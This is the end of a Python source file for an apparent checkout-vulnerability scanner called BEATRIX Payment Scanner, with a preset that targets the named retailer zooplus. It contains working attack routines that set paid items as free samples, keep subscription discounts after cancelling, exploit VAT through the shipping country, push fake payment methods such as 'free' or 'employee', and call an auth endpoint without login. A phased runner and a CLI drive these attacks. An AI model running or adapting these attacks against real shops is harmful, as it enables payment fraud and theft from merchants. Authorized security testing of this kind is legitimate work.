                    title=f"Free Sample Abuse: Article {article_id} set as free sample",
                    severity=Severity.HIGH,
                    confidence=Confidence.TENTATIVE,
                    url=str(resp.url),
                    description=(
                        f"Successfully set article {article_id} as a free sample. "
                        f"If this is a paid product, it may result in receiving it "
                        f"for free."
                    ),
                    evidence=f"Status: {resp.status_code}\n{resp.text[:300]}",
                    request=f"PUT {resp.url}\n{json.dumps(body)}",
                )

    async def test_subscription_manipulation(self) -> AsyncIterator[Finding]:
        """
        Test: Manipulate subscription pricing/intervals.

        Subscription plans often have discounted prices.
        Can we set subscription and then immediately convert to single delivery?
        """
        set_sub = self._find_endpoint("/set-cart-subscription-details")
        remove_sub = self._find_endpoint("/convert-cart-to-single-delivery")

        if not set_sub:
            return

        # Test unusual intervals
        test_intervals = ["0", "1", "-1", "99999", "0.5", "null"]

        for interval in test_intervals:
            resp = await self._checkout_request(
                set_sub,
                path_params={"interval": interval},
            )
            if resp and resp.status_code == 200:
                yield self.create_finding(
                    title=f"Subscription Manipulation: interval={interval} accepted",
                    severity=Severity.MEDIUM,
                    confidence=Confidence.FIRM,
                    url=str(resp.url),
                    description=(
                        f"Setting subscription interval to '{interval}' was accepted. "
                        f"An interval of 0 or negative could cause billing errors."
                    ),
                    evidence=f"Status: {resp.status_code}\n{resp.text[:300]}",
                )

        # Test: set subscription (get discount), then immediately remove it
        if remove_sub:
            # Add subscription
            resp1 = await self._checkout_request(
                set_sub, path_params={"interval": "4"},  # 4 weeks
            )
            await asyncio.sleep(self.checkout_config.request_delay)

            # Immediately remove
            resp2 = await self._checkout_request(remove_sub)

            if resp1 and resp1.status_code == 200 and resp2 and resp2.status_code == 200:
                self.log(
                    "[SUBSCRIPTION] Set+remove succeeded. "
                    "Check if subscription discount persists after removal."
                )
                yield self.create_finding(
                    title="Subscription discount persistence after removal",
                    severity=Severity.HIGH,
                    confidence=Confidence.TENTATIVE,
                    url=str(resp2.url),
                    description=(
                        "Successfully set a subscription (which may apply a discount) "
                        "and then immediately removed it. If the discount persists "
                        "after removal, this allows buying at subscription prices "
                        "without committing to a subscription."
                    ),
                    evidence=(
                        f"Set subscription → {resp1.status_code}\n"
                        f"Remove subscription → {resp2.status_code}"
                    ),
                )

    async def test_shipping_country_exploit(self) -> AsyncIterator[Finding]:
        """
        Test: Change shipping country to exploit price differences.

        Different countries may have different VAT rates or pricing.
        Can we set a low-VAT country and checkout with local address?
        """
        endpoint = self._find_endpoint("/change-shipping-country")
        if not endpoint:
            return

        # Test countries with different VAT rates
        test_countries = [
            ("LI", "9999", "Liechtenstein - low VAT"),
            ("CH", "8000", "Switzerland - no EU VAT"),
            ("GB", "SW1A 1AA", "UK - post-Brexit"),
            ("XX", "00000", "Invalid country code"),
            ("", "", "Empty country"),
        ]

        for country, zipcode, desc in test_countries:
            resp = await self._checkout_request(
                endpoint,
                path_params={"country": country, "zipCode": zipcode},
            )
            if resp and resp.status_code == 200:
                yield self.create_finding(
                    title=f"Shipping Country Exploit: {desc}",
                    severity=Severity.MEDIUM,
                    confidence=Confidence.TENTATIVE,
                    url=str(resp.url),
                    description=(
                        f"Successfully changed shipping country to {country} ({desc}). "
                        f"This may exploit VAT/pricing differences between countries."
                    ),
                    evidence=f"Status: {resp.status_code}\n{resp.text[:300]}",
                )

    async def test_payment_method_bypass(self) -> AsyncIterator[Finding]:
        """
        Test: Can we set preferred payment to a non-existent or manipulated method?

        Vectors:
        - Set payment method to 'free' or 'none'
        - Set a fake PSP identifier
        - Delete all payment methods and try to order
        """
        update_payment = self._find_endpoint("/payment/method/preferred")
        if not update_payment:
            return

        test_methods = [
            {"paymentMethod": "free"},
            {"paymentMethod": "none"},
            {"paymentMethod": "test"},
            {"paymentMethod": "internal"},
            {"paymentMethod": "employee"},
            {"paymentMethod": "INVOICE", "amount": 0},
            {"paymentMethod": "CREDIT_CARD", "amount": 0.01},
        ]

        self.state.checkout_page_id = "preview"

        for method_body in test_methods:
            resp = await self._checkout_request(
                update_payment, body=method_body,
            )
            if resp and resp.status_code == 200:
                yield self.create_finding(
                    title=f"Payment Method Bypass: {method_body.get('paymentMethod', '?')} accepted",
                    severity=Severity.CRITICAL,
                    confidence=Confidence.FIRM,
                    url=str(resp.url),
                    description=(
                        f"Payment method set to '{method_body}' was accepted. "
                        f"If 'free' or 'none' is processed, this is a critical "
                        f"payment bypass."
                    ),
                    evidence=f"Status: {resp.status_code}\n{resp.text[:300]}",
                    request=f"PATCH {resp.url}\n{json.dumps(method_body)}",
                )

    async def test_delete_auth_cookies_unauth(self) -> AsyncIterator[Finding]:
        """
        Test: Can unauthenticated users call delete-auth-cookies?

        If so, this might be usable for session invalidation attacks.
        """
        endpoint = self._find_endpoint("/v2/delete-auth-cookies")
        if not endpoint:
            return

        # Save auth state, try without auth
        original_cookies = dict(self.state.cookies)
        self.state.cookies = {}
        self.state.csrf_token = None

        cfg = self.checkout_config
        url = f"{cfg.base_url}{cfg.checkout_base}/v2/delete-auth-cookies"

        resp = await self._throttled_request("DELETE", url)

        # Restore
        self.state.cookies = original_cookies

        if resp and resp.status_code == 200:
            yield self.create_finding(
                title="Delete Auth Cookies accessible without authentication",
                severity=Severity.MEDIUM,
                confidence=Confidence.FIRM,
                url=url,
                description=(
                    "The delete-auth-cookies endpoint is accessible without "
                    "authentication. This could be used for session invalidation "
                    "attacks if combined with CSRF."
                ),
                evidence=f"Status: {resp.status_code}",
            )

    # =========================================================================
    # HELPERS
    # =========================================================================

    def _find_endpoint(self, path_contains: str) -> Optional[CheckoutEndpoint]:
        """Find a configured endpoint by path substring"""
        for ep in self.checkout_config.endpoints:
            if path_contains in ep.path:
                return ep
        return None

    # =========================================================================
    # MAIN SCAN ENTRY POINT
    # =========================================================================

    async def scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """
        Run full payment/checkout scan.

        Phases:
        1. Discovery — find cart version, get state
        2. Quantity Tampering — negative/overflow quantities
        3. Price Manipulation — inject price fields
        4. Coupon Abuse — brute-force and stacking
        5. Stage Skipping — bypass payment flow
        6. Race Conditions — concurrent requests
        7. Session IDOR — access other carts
        8. Free Sample Abuse — set paid items as samples
        9. Subscription Tricks — discount persistence
        10. Payment Method Bypass — fake payment methods
        """
        self.log("=" * 60)
        self.log("BEATRIX Payment Scanner v1.0")
        self.log(f"Target: {self.checkout_config.base_url}")
        self.log(f"Endpoints: {len(self.checkout_config.endpoints)}")
        self.log(f"Rate limit: {self.checkout_config.request_delay}s between requests")
        self.log("=" * 60)

        # Phase 0: Connectivity
        self.log("\n[Phase 0] Connectivity check...")
        version = await self.discover_cart_version()
        if not version:
            self.log("[ABORT] Cannot reach cart API. Possible IP block.")
            return

        # Phase 0.5: Get initial state
        self.log("\n[Phase 0.5] Discovering checkout state...")
        state = await self.discover_checkout_state()
        if state:
            self.log(f"[STATE] Got checkout state: {json.dumps(state)[:200]}")
        else:
            self.log("[STATE] Could not retrieve state, continuing with attacks...")

        # Phase 1: Pick an article to test with
        article_id = int(self.checkout_config.test_product_ids[0]) if self.checkout_config.test_product_ids else 156523

        # Phase 2: Quantity Tampering
        self.log("\n[Phase 2] Quantity Tampering...")
        async for finding in self.test_quantity_tampering(article_id):
            self.findings.append(finding)
            yield finding

        if self.state.is_blocked:
            self.log("[BLOCKED] Stopping scan due to WAF block")
            return

        # Phase 3: Price Manipulation
        self.log("\n[Phase 3] Price Manipulation...")
        async for finding in self.test_price_manipulation(article_id):
            self.findings.append(finding)
            yield finding

        if self.state.is_blocked:
            return

        # Phase 4: Coupon Abuse
        self.log("\n[Phase 4] Coupon Abuse...")
        async for finding in self.test_coupon_abuse():
            self.findings.append(finding)
            yield finding

        if self.state.is_blocked:
            return

        # Phase 5: Stage Skipping
        self.log("\n[Phase 5] Stage Skipping...")
        async for finding in self.test_stage_skipping():
            self.findings.append(finding)
            yield finding

        if self.state.is_blocked:
            return

        # Phase 6: Free Sample Abuse
        self.log("\n[Phase 6] Free Sample Abuse...")
        async for finding in self.test_free_sample_abuse():
            self.findings.append(finding)
            yield finding

        if self.state.is_blocked:
            return

        # Phase 7: Subscription Manipulation
        self.log("\n[Phase 7] Subscription Manipulation...")
        async for finding in self.test_subscription_manipulation():
            self.findings.append(finding)
            yield finding

        if self.state.is_blocked:
            return

        # Phase 8: Shipping Country Exploit
        self.log("\n[Phase 8] Shipping Country Exploit...")
        async for finding in self.test_shipping_country_exploit():
            self.findings.append(finding)
            yield finding

        if self.state.is_blocked:
            return

        # Phase 9: Payment Method Bypass
        self.log("\n[Phase 9] Payment Method Bypass...")
        async for finding in self.test_payment_method_bypass():
            self.findings.append(finding)
            yield finding

        if self.state.is_blocked:
            return

        # Phase 10: Delete Auth Cookies (unauth test)
        self.log("\n[Phase 10] Delete Auth Cookies Test...")
        async for finding in self.test_delete_auth_cookies_unauth():
            self.findings.append(finding)
            yield finding

        if self.state.is_blocked:
            return

        # Phase 11: Session IDOR
        self.log("\n[Phase 11] Session IDOR...")
        async for finding in self.test_idor_session():
            self.findings.append(finding)
            yield finding

        # Summary
        self.log("\n" + "=" * 60)
        self.log("SCAN COMPLETE")
        self.log(f"Requests made: {self._request_count}")
        self.log(f"WAF blocks: {self._block_count}")
        self.log(f"Findings: {len(self.findings)}")
        for f in self.findings:
            self.log(f"  {f.severity.value.upper()} | {f.title}")
        self.log("=" * 60)

    # =========================================================================
    # STANDALONE RUNNER
    # =========================================================================

    async def run_standalone(
        self,
        preset: str = "zooplus",
        username: str = "",
        password: str = "",
        authenticate: bool = True,
    ) -> List[Finding]:
        """
        Convenience method to run scan standalone (no framework).

        Usage:
            scanner = PaymentScanner(preset="zooplus")
            findings = await scanner.run_standalone(
                username="user@example.com",
                password="password123",
            )
        """
        async with self:
            if authenticate and username and password:
                self.log("Authenticating...")
                auth_ok = await self.authenticate_keycloak(username, password)
                if not auth_ok:
                    self.log("Authentication failed, continuing without auth...")

            context = ScanContext.from_url(self.checkout_config.base_url)

            async for finding in self.scan(context):
                pass  # Findings stored in self.findings

        return self.findings


# =============================================================================
# CLI ENTRY POINT
# =============================================================================

def main():
    """CLI entry point for standalone scanning"""
    import argparse

    parser = argparse.ArgumentParser(
        description="BEATRIX Payment Scanner — checkout flow vulnerability testing"
    )
    parser.add_argument("--target", "-t", required=True, help="Target base URL")
    parser.add_argument("--preset", "-p", choices=["zooplus"], help="Use preset config")
    parser.add_argument("--username", "-u", help="Login username")
    parser.add_argument("--password", help="Login password")
    parser.add_argument("--no-auth", action="store_true", help="Skip authentication")
    parser.add_argument("--delay", type=float, default=5.0, help="Delay between requests (seconds)")
    parser.add_argument("--output", "-o", help="Output file for findings (JSON)")

    args = parser.parse_args()

    if args.preset:
        scanner = PaymentScanner(preset=args.preset)
        if args.target:
            scanner.checkout_config.base_url = args.target
    else:
        config = CheckoutConfig(
            base_url=args.target,
            request_delay=args.delay,
        )
        scanner = PaymentScanner(config=config)

    if args.delay:
        scanner.checkout_config.request_delay = args.delay

    async def run():
        findings = await scanner.run_standalone(
            username=args.username or "",
            password=args.password or "",
            authenticate=not args.no_auth,
        )

        if args.output and findings:
            output_data = [
                {
                    "title": f.title,
                    "severity": f.severity.value,
                    "confidence": f.confidence.value,
                    "url": f.url,
                    "description": f.description,
                    "evidence": f.evidence,
                    "request": f.request,
                    "response": f.response,
                }
                for f in findings
            ]
            with open(args.output, "w") as fh:
                json.dump(output_data, fh, indent=2)
            print(f"\nFindings saved to {args.output}")

        return findings

    asyncio.run(run())


if __name__ == "__main__":
    main()
